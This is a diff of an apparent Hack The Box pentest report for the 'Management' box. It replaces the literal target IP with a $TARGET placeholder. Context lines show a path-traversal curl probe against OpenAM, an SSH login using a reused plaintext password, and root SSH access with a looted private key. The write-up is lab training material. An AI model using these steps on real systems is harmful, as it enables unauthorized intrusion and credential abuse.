@@ -1,6 +1,6 @@
 # Management — HTB Walkthrough (professional pentest report)
 
-- **Target:** 10.129.244.176
+- **Target:** $TARGET
 - **Box:** Management (easy, Linux / Ubuntu 24.04)
 - **Date:** 2026-09-30
 - **Result:** ✅ Fully compromised — user.txt + root.txt
@@ -47,7 +47,7 @@ Evidence: `nmap/services.txt`, `nmap/allports.txt`
   traversal that the 2021 bug depends on — **this specific CVE is patched**.
 
 ```
-curl -sk -i --resolve sso.management.htb:443:10.129.244.176 \
+curl -sk -i --resolve sso.management.htb:443:$TARGET \
   "https://sso.management.htb/openam/oauth2/..;/ccversion/Version"
 # GET -> 200 (normal page, traversal collapses cleanly — Tomcat 10.1.52 patched it)
 ```
@@ -104,7 +104,7 @@ php -r 'define("GLPI_CONFIG_DIR","/opt/glpi/config");
 That password was reused for the **local Linux account `owen`**:
 
 ```bash
-ssh owen@10.129.244.176   # password: WpczC40GhTbk
+ssh owen@$TARGET   # password: WpczC40GhTbk
 id  # uid=1000(owen) gid=1000(owen)
 ```
 
@@ -140,7 +140,7 @@ This mirrors the entire `/root` directory — including `root.txt` and
 a stable root credential:
 
 ```bash
-ssh -i loot/root_id_ed25519 root@10.129.244.176
+ssh -i loot/root_id_ed25519 root@$TARGET
 id  # uid=0(root)
 ```
 
